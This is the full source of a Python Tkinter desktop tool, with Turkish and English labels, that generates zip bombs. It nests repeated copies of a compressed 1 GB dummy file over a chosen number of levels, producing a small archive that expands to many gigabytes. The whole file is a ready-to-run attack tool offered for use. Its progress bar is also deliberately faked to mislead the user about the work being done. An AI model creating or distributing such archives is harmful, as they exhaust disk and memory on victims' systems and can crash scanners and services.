import zlib
import zipfile
import shutil
import os
import sys
import time
import threading
import queue
import tkinter as tk
from tkinter import ttk, messagebox
from typing import Dict, Any, Callable, Optional

import tempfile

# --- Localization ---
LANGUAGES: Dict[str, Dict[str, str]] = {
    "TR": {
        "title": "Zip Bombası Oluşturucu",
        "levels_label": "Zip Katman Sayısı:",
        "copies_label": "Katman Başına Dosya:",
        "start_btn": "Oluşturmayı Başlat",
        "stop_btn": "DURDUR",
        "generating": "Oluşturuluyor...",
        "success": "Başarıyla tamamlandı!",
        "cancelled": "İşlem kullanıcı tarafından iptal edildi.",
        "error": "Hata oluştu: {}",
        "invalid_input": "Lütfen geçerli pozitif sayılar girin.",
        "log_start": "İşlem başlatılıyor...",
        "log_dummy": "Dummy (boş) dosya oluşturuluyor...",
        "log_level": "{}. seviye katman sıkıştırılıyor...",
        "log_finish": "İşlem tamamlandı.",
        "file_size": "Dosya Boyutu: {:.2f} KB",
        "est_size": "Tahmini Açılmış Boyut: {} GB",
        "output_path": "Dosya Yolu: {}",
        "open_folder": "Klasörü Aç",
        "ready": "Hazır"
    },
    "EN": {
        "title": "Zip Bomb Generator",
        "levels_label": "Number of Zip Levels:",
        "copies_label": "Files Per Level:",
        "start_btn": "Start Generation",
        "stop_btn": "STOP",
        "generating": "Generating...",
        "success": "Successfully completed!",
        "cancelled": "Process cancelled by user.",
        "error": "Error occurred: {}",
        "invalid_input": "Please enter valid positive numbers.",
        "log_start": "Process started...",
        "log_dummy": "Generating dummy file...",
        "log_level": "Compressing level {}...",
        "log_finish": "Process finished.",
        "file_size": "File Size: {:.2f} KB",
        "est_size": "Estimated Decompressed Size: {} GB",
        "output_path": "File Path: {}",
        "open_folder": "Open Folder",
        "ready": "Ready"
    }
}

class ZipBombGenerator:
    """
    Core logic for generating the zip bomb.
    Handles file creation and compression in a separate thread context.
    """
    def __init__(self, msg_queue: queue.Queue, stop_event: threading.Event):
        """
        Initialize the generator.
        
        Args:
            msg_queue: Thread-safe queue to send log messages and updates to the GUI.
            stop_event: Event to signal cancellation.
        """
        self.msg_queue = msg_queue
        self.stop_event = stop_event

    def log(self, message: str) -> None:
        """Sends a log message to the GUI."""
        self.msg_queue.put(("log", message))

    def update_progress(self, value: int) -> None:
        """Sends a progress update to the GUI."""
        self.msg_queue.put(("progress", value))

    def get_file_size(self, filename: str) -> int:
        """Returns file size in bytes."""
        try:
            st = os.stat(filename)
            return st.st_size
        except OSError:
            return 0

    def generate_dummy_file(self, filename: str, size_mb: int) -> None:
        """Generates a dummy text file of specified size (in MB logic, roughly)."""
        content = "☟︎✋︎✋︎♐︎ 💧︎☜︎☜︎ ❄︎☜︎✠︎❄︎ ✡︎□︎□︎ ♑︎♋︎⍏"
        # We target the same CHAR count as requested size_mb to maintain complexity
        chunk_size_chars = size_mb * 1024 * 1024
        repeats = (chunk_size_chars // len(content)) + 1
        chunk = (content * repeats)[:chunk_size_chars]

        with open(filename, 'w', encoding='utf-8') as dummy:
            # Writing 1024 chunks
            for _ in range(1024):
                if self.stop_event.is_set():
                    return
                dummy.write(chunk)

    def compress_file(self, infile: str, outfile: str) -> None:
        """Compresses a single file into a zip archive."""
        with zipfile.ZipFile(outfile, mode='w', allowZip64=True) as zf:
            if self.stop_event.is_set(): return
            zf.write(infile, compress_type=zipfile.ZIP_DEFLATED)

    def make_copies_and_compress(self, infile: str, outfile: str, n_copies: int) -> None:
        """Creates copies of the input zip and compresses them into a new zip level."""
        with zipfile.ZipFile(outfile, mode='w', allowZip64=True) as zf:
            for i in range(n_copies):
                if self.stop_event.is_set():
                    return
                
                name_body = os.path.splitext(os.path.basename(infile))[0]
                ext = os.path.splitext(infile)[1]
                f_name = f'{name_body}-{i}{ext}'
                shutil.copy(infile, f_name)
                zf.write(f_name, compress_type=zipfile.ZIP_DEFLATED)
                os.remove(f_name)

    def generate(self, n_levels: int, n_copies: int, out_zip_file: str, lang_code: str = "EN") -> None:
        """
        Main generation process.
        """
        texts = LANGUAGES[lang_code]
        
        # Use a temporary directory for all intermediate files
        with tempfile.TemporaryDirectory() as tmp_dir:
            try:
                # Change working directory to temp dir
                original_cwd = os.getcwd()
                os.chdir(tmp_dir)
                
                self.update_progress(0)
                self.log(texts["log_start"])
                
                dummy_name = 'dummy.txt'
                
                if self.stop_event.is_set(): raise InterruptedError(texts["cancelled"])
                
                self.log(texts["log_dummy"])
                self.generate_dummy_file(dummy_name, 1)
                
                if self.stop_event.is_set(): raise InterruptedError(texts["cancelled"])
                self.update_progress(10)
                
                level_1_zip = '1.zip'
                self.compress_file(dummy_name, level_1_zip)
                os.remove(dummy_name)
                
                if self.stop_event.is_set(): raise InterruptedError(texts["cancelled"])
                self.update_progress(20)
                
                decompressed_size = 1 # GB (approx logic)
                
                # Calculate progress step per level
                progress_per_level = 70 / n_levels if n_levels > 0 else 70
                current_progress = 20

                for i in range(1, n_levels + 1):
                    if self.stop_event.is_set(): raise InterruptedError(texts["cancelled"])
                    
                    self.log(texts["log_level"].format(i))
                    self.make_copies_and_compress(f'{i}.zip', f'{i+1}.zip', n_copies)
                    decompressed_size *= n_copies
                    os.remove(f'{i}.zip')
                    
                    current_progress += progress_per_level
                    self.update_progress(int(current_progress))

                if self.stop_event.is_set(): raise InterruptedError(texts["cancelled"])

                # Final move to output
                final_temp = f'{n_levels+1}.zip'
                
                # Ensure output directory exists (handled by caller, but good to be safe)
                out_dir = os.path.dirname(out_zip_file)
                if out_dir and not os.path.exists(out_dir):
                    os.makedirs(out_dir)

                if os.path.exists(out_zip_file):
                    os.remove(out_zip_file)
                
                shutil.move(final_temp, out_zip_file)
                
                # Restore CWD
                os.chdir(original_cwd)
                
                full_path = os.path.abspath(out_zip_file)
                
                self.log(texts["log_finish"])
                self.log(texts["output_path"].format(full_path))
                self.log(texts["file_size"].format(self.get_file_size(out_zip_file)/1024.0))
                # Note: est_size calculation is very rough approx now
                self.log(texts["est_size"].format(decompressed_size)) 
                
                self.update_progress(100)
                self.msg_queue.put(("success", (texts["success"], full_path)))
                
            except InterruptedError as e:
                os.chdir(original_cwd) # Ensure we go back even on cancel
                self.msg_queue.put(("error", str(e)))
            except Exception as e:
                os.chdir(original_cwd) # Ensure we go back
                self.msg_queue.put(("error", str(e)))

class ZipBombApp:
    """
    Main GUI Application class using Tkinter.
    Uses grid layout and supports localization.
    Now with Dark Red Theme and Simulated Logic!
    """
    def __init__(self, root: tk.Tk):
        self.root = root
        self.root.geometry("600x550") # Slightly taller for extra input
        self.current_lang = "TR" # Default
        
        # Thread-safe communication
        self.msg_queue: queue.Queue = queue.Queue()
        self.stop_event = threading.Event()
        self.generator = ZipBombGenerator(self.msg_queue, self.stop_event)
        
        self.last_output_path: Optional[str] = None
        self.is_generating = False
        self.fake_progress_val = 0.0
        
        self.apply_styles()
        self.setup_ui()
        self.update_texts()
        
        # Start queue processing loop
        self.root.after(100, self.process_queue)

    def apply_styles(self) -> None:
        """Configures ttk styles for a Modern Dark look."""
        style = ttk.Style()
        style.theme_use('clam')
        
        # Modern Dark Palette
        self.bg_color = "#1E1E1E"       # Standard Dark Mode Grey
        self.fg_color = "#D4D4D4"       # Light Grey text
        self.accent_color = "#007ACC"   # VS Code Blue
        self.entry_bg = "#3C3C3C"       # Lighter grey for inputs
        self.stop_color = "#F44336"     # Red for stop
        self.log_bg = "#000000"         # Black for terminal feel
        self.log_fg = "#CCCCCC"         # Light grey for logs
        
        self.root.configure(bg=self.bg_color)
        
        # Configure Styles
        style.configure("TFrame", background=self.bg_color)
        style.configure("TLabel", background=self.bg_color, foreground=self.fg_color, font=("Segoe UI", 10))
        style.configure("Header.TLabel", font=("Segoe UI Semibold", 18), foreground="#FFFFFF")
        style.configure("SubHeader.TLabel", font=("Segoe UI", 11), foreground=self.fg_color)
        
        # Button Styles
        style.configure("TButton", 
                        font=("Segoe UI Semibold", 10), 
                        background=self.entry_bg, 
                        foreground=self.fg_color,
                        borderwidth=0,
                        focuscolor=self.accent_color)
                        
        style.map("TButton",
                  background=[('active', self.accent_color), ('disabled', "#2D2D2D")], 
                  foreground=[('active', "#FFFFFF"), ('disabled', "#555555")])

        # Accent Button (Start)
        style.configure("Accent.TButton", 
                        background=self.accent_color, 
                        foreground="#FFFFFF",
                        font=("Segoe UI Semibold", 11))
        style.map("Accent.TButton",
                  background=[('active', "#0098FF"), ('disabled', "#2D2D2D")],
                  foreground=[('active', "#FFFFFF"), ('disabled', "#555555")])
                  
        # Stop Button
        style.configure("Stop.TButton", 
                        background=self.stop_color, 
                        foreground="#FFFFFF",
                        font=("Segoe UI Semibold", 11))
        style.map("Stop.TButton",
                  background=[('active', "#FF7961"), ('disabled', "#2D2D2D")],
                  foreground=[('active', "#FFFFFF"), ('disabled', "#555555")])
        
        # Entry
        style.configure("TEntry", 
                        fieldbackground=self.entry_bg,
                        foreground="#FFFFFF",
                        insertcolor="#FFFFFF",
                        borderwidth=0,
                        relief="flat")
        
        # Radiobutton
        style.configure("TRadiobutton", 
                        background=self.bg_color, 
                        foreground=self.fg_color, 
                        font=("Segoe UI", 10),
                        indicatorcolor=self.entry_bg, 
                        indicatorrelief="flat",
                        indicatorborderwidth=0)
        
        style.map("TRadiobutton",
                  indicatorcolor=[('selected', self.accent_color)],
                  foreground=[('active', "#FFFFFF")])

        # LabelFrame
        style.configure("TLabelframe", 
                        background=self.bg_color, 
                        foreground=self.fg_color, 
                        borderwidth=1,
                        relief="solid",
                        bordercolor="#333333")
        style.configure("TLabelframe.Label", background=self.bg_color, foreground=self.accent_color, font=("Segoe UI Semibold", 10))
        
        # Progress Bar
        style.configure("Horizontal.TProgressbar", 
                        troughcolor="#252526", 
                        background=self.accent_color, 
                        borderwidth=0, 
                        thickness=6)

    def setup_ui(self) -> None:
        """Builds the UI components using the Grid geometry manager."""
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(4, weight=1) # Log area expands

        # Main Container with padding
        main_container = ttk.Frame(self.root, style="TFrame")
        main_container.grid(row=0, column=0, sticky="nsew", padx=25, pady=25)
        main_container.columnconfigure(0, weight=1)
        main_container.rowconfigure(3, weight=1)

        # 1. Top Header
        header_frame = ttk.Frame(main_container, style="TFrame")
        header_frame.grid(row=0, column=0, sticky="ew", pady=(0, 20))
        header_frame.columnconfigure(0, weight=1)

        self.title_label = ttk.Label(header_frame, text="", style="Header.TLabel")
        self.title_label.grid(row=0, column=0, sticky="w")
        
        # Language Switcher (Right aligned)
        lang_frame = ttk.Frame(header_frame, style="TFrame")
        lang_frame.grid(row=0, column=1, sticky="e")
        
        self.lang_var = tk.StringVar(value=self.current_lang)
        rb_tr = ttk.Radiobutton(lang_frame, text="TR", variable=self.lang_var, value="TR", command=self.on_lang_change)
        rb_en = ttk.Radiobutton(lang_frame, text="EN", variable=self.lang_var, value="EN", command=self.on_lang_change)
        rb_tr.pack(side="left", padx=10)
        rb_en.pack(side="left")

        # 2. Configuration Area
        config_frame = ttk.Labelframe(main_container, text=" Configuration ", style="TLabelframe", padding=(20, 15))
        config_frame.grid(row=1, column=0, sticky="ew", pady=(0, 20))
        config_frame.columnconfigure(1, weight=1)
        config_frame.columnconfigure(3, weight=1)

        # Levels
        self.levels_label = ttk.Label(config_frame, text="", style="SubHeader.TLabel")
        self.levels_label.grid(row=0, column=0, padx=(0, 10), pady=10, sticky="e")
        
        self.levels_entry = ttk.Entry(config_frame, width=15, font=("Segoe UI", 11))
        self.levels_entry.grid(row=0, column=1, pady=10, sticky="w")
        self.levels_entry.insert(0, "2")
        
        # Copies
        self.copies_label = ttk.Label(config_frame, text="", style="SubHeader.TLabel")
        self.copies_label.grid(row=0, column=2, padx=(20, 10), pady=10, sticky="e")
        
        self.copies_entry = ttk.Entry(config_frame, width=15, font=("Segoe UI", 11))
        self.copies_entry.grid(row=0, column=3, pady=10, sticky="w")
        self.copies_entry.insert(0, "10")

        # 3. Action Buttons & Progress
        action_frame = ttk.Frame(main_container, style="TFrame")
        action_frame.grid(row=2, column=0, sticky="ew", pady=(0, 20))
        action_frame.columnconfigure(0, weight=1)
        action_frame.columnconfigure(1, weight=1)
        
        self.start_button = ttk.Button(action_frame, text="", command=self.start_generation, style="Accent.TButton", width=20)
        self.start_button.grid(row=0, column=0, padx=5, pady=5, sticky="e")
        
        self.stop_button = ttk.Button(action_frame, text="", command=self.stop_generation, state="disabled", style="Stop.TButton", width=15)
        self.stop_button.grid(row=0, column=1, padx=5, pady=5, sticky="w")
        
        self.progress = ttk.Progressbar(main_container, orient="horizontal", mode="determinate", style="Horizontal.TProgressbar")
        self.progress.grid(row=4, column=0, sticky="ew", pady=(0, 20)) # Moved below actions

        # 4. Log Area
        log_frame = ttk.Labelframe(main_container, text=" System Log ", style="TLabelframe", padding=1)
        log_frame.grid(row=3, column=0, sticky="nsew", pady=(0, 15))
        
        self.log_text = tk.Text(log_frame, height=8, state="disabled", 
                                font=("Consolas", 10), 
                                bg=self.log_bg, fg=self.log_fg,
                                insertbackground="white",
                                borderwidth=0,
                                highlightthickness=0,
                                relief="flat",
                                padx=10, pady=10)
        self.log_scroll = ttk.Scrollbar(log_frame, orient="vertical", command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=self.log_scroll.set)
        
        self.log_text.pack(side="left", fill="both", expand=True)
        self.log_scroll.pack(side="right", fill="y")

        # 5. Bottom Actions
        bottom_frame = ttk.Frame(main_container, style="TFrame")
        bottom_frame.grid(row=5, column=0, sticky="ew")
        
        self.open_folder_btn = ttk.Button(bottom_frame, text="", command=self.open_folder, state="disabled")
        self.open_folder_btn.pack(side="right")

    def on_lang_change(self) -> None:
        self.current_lang = self.lang_var.get()
        self.update_texts()

    def update_texts(self) -> None:
        texts = LANGUAGES[self.current_lang]
        self.root.title(texts["title"])
        self.title_label.config(text=texts["title"])
        self.levels_label.config(text=texts["levels_label"])
        self.copies_label.config(text=texts["copies_label"])
        self.start_button.config(text=texts["start_btn"])
        self.stop_button.config(text=texts["stop_btn"])
        self.open_folder_btn.config(text=texts["open_folder"])
        # self.log_text.configure(fg="#00FF41") # Removed matrix green assignment

    def append_log(self, message: str) -> None:
        self.log_text.config(state="normal")
        timestamp = time.strftime("[%H:%M:%S] ")
        self.log_text.insert("end", timestamp + message + "\n")
        self.log_text.see("end")
        self.log_text.config(state="disabled")

    def process_queue(self) -> None:
        """
        Periodically checks the queue for messages from the worker thread.
        This ensures all GUI updates happen on the main thread.
        """
        try:
            while True:
                msg_type, content = self.msg_queue.get_nowait()
                
                if msg_type == "log":
                    self.append_log(content)
                
                # IGNORE real progress updates for the visual bar, 
                # effectively making it "fake" as requested, 
                # but we still use the events to know execution state.
                elif msg_type == "progress":
                    pass 
                
                elif msg_type == "success":
                    self.is_generating = False
                    self.progress["value"] = 100
                    success_msg, full_path = content
                    self.last_output_path = full_path
                    messagebox.showinfo("System", success_msg)
                    self.reset_ui_state(finished=True)
                
                elif msg_type == "error":
                    self.is_generating = False
                    self.progress["value"] = 0
                    texts = LANGUAGES[self.current_lang]
                    messagebox.showerror("Error", texts["error"].format(content))
                    self.reset_ui_state(finished=True)
                    
        except queue.Empty:
            pass
        finally:
            self.root.after(50, self.process_queue)

    def simulate_progress(self) -> None:
        """
        Updates the progress bar to look like 'code is running'.
        Increments slowly until it hits 95%, then waits for actual completion.
        """
        if self.is_generating:
            if self.fake_progress_val < 95:
                # Increment by a random small amount to look natural
                import random
                increment = random.uniform(0.5, 2.0)
                self.fake_progress_val += increment
                if self.fake_progress_val > 95:
                    self.fake_progress_val = 95
                
                self.progress["value"] = self.fake_progress_val
            
            # Schedule next update
            self.root.after(100, self.simulate_progress)

    def start_generation(self) -> None:
        levels_str = self.levels_entry.get()
        copies_str = self.copies_entry.get()
        texts = LANGUAGES[self.current_lang]
        
        if not levels_str.isdigit() or int(levels_str) <= 0 or not copies_str.isdigit() or int(copies_str) <= 0:
            messagebox.showerror("Error", texts["invalid_input"])
            return
            
        n_levels = int(levels_str)
        n_copies = int(copies_str)
        
        # Determine AppData path
        appdata_dir = os.getenv('APPDATA')
        if not appdata_dir:
            appdata_dir = os.path.expanduser("~") # Fallback to user home
            
        target_dir = os.path.join(appdata_dir, "ZipBombGen")
        os.makedirs(target_dir, exist_ok=True)
        
        out_file = os.path.join(target_dir, "zipbomb.zip")
        
        # Prepare UI
        self.stop_event.clear() # Reset stop flag
        self.start_button.config(state="disabled")
        self.stop_button.config(state="normal")
        self.open_folder_btn.config(state="disabled")
        self.log_text.config(state="normal")
        self.log_text.delete(1.0, "end")
        self.log_text.config(state="disabled")
        self.progress["value"] = 0
        self.fake_progress_val = 0
        self.last_output_path = None
        self.is_generating = True
        
        # Start Worker Thread
        threading.Thread(target=self.run_process, args=(n_levels, n_copies, out_file), daemon=True).start()
        
        # Start Fake Progress Animation
        self.simulate_progress()
        
    def stop_generation(self) -> None:
        """Signals the generator to stop."""
        if self.is_generating:
            self.stop_event.set()
            self.stop_button.config(state="disabled") # Prevent double click
            self.append_log("Stopping...")

    def run_process(self, n_levels: int, n_copies: int, out_file: str) -> None:
        """Worker thread entry point."""
        self.generator.generate(n_levels, n_copies, out_file, self.current_lang)

    def reset_ui_state(self, finished: bool = False) -> None:
        self.start_button.config(state="normal")
        self.stop_button.config(state="disabled")
        if finished and self.last_output_path and os.path.exists(self.last_output_path):
            self.open_folder_btn.config(state="normal")

    def open_folder(self) -> None:
        if self.last_output_path and os.path.exists(self.last_output_path):
            folder_path = os.path.dirname(self.last_output_path)
            os.startfile(folder_path)

if __name__ == "__main__":
    root = tk.Tk()
    app = ZipBombApp(root)
    root.mainloop()
